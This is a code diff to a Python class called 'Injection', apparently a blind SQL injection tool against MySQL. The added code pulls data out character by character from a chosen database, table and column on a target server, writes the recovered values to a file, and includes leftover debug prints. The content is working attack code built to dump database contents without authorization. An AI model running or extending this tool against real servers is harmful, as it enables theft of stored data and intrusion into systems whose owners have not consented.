@@ -115,6 +115,9 @@ class Injection:
 		elif tipo == "columnas":
 			coord = "," + str(fila)+",1"
 			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
+		elif tipo == "datos":
+			coord = "," + str(fila)+",1"
+			direccion = obj.server+manejador[tipo][0]+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+")"+coord+manejador[tipo][4]
 
 		#print "Coordenada: "+coord
 		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
@@ -289,7 +292,29 @@ class Injection:
 											if where != '' and table != '' and columna != '':
 												print "Base: "+where+" Tabla:"+table+" columnas: "+columna
 												f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");
-												
+												char2 = "No encontrado"
+												bandera2 = 0
+												indiceY2	= 1
+												indiceX2 = 0
+												while char2 == "No encontrado" and bandera2 != 1:
+													char2 = ""
+													dato = ""
+													print "lol"
+													while char2 != "No encontrado":
+														condicion2 = columna + " from " + where + "." + table + " "
+														char2 =self.busqueda(self,self.catalogoMySQL,"datos",pagina.text,126,32,indiceY2,indiceX2,condicion2)
+														print "Caracter: "+char2
+														if char2 != "No encontrado":
+															dato += char2
+															indiceY2 = indiceY2 +1
+													#bases[where].append(tabla)
+													f.write(dato+"\n")
+													#print "TABLA: "+tabla
+													dato = ""
+													indiceX2 = indiceX2 + 1
+													bandera2 = indiceY2
+													indiceY2 = 1
+
 
 
 
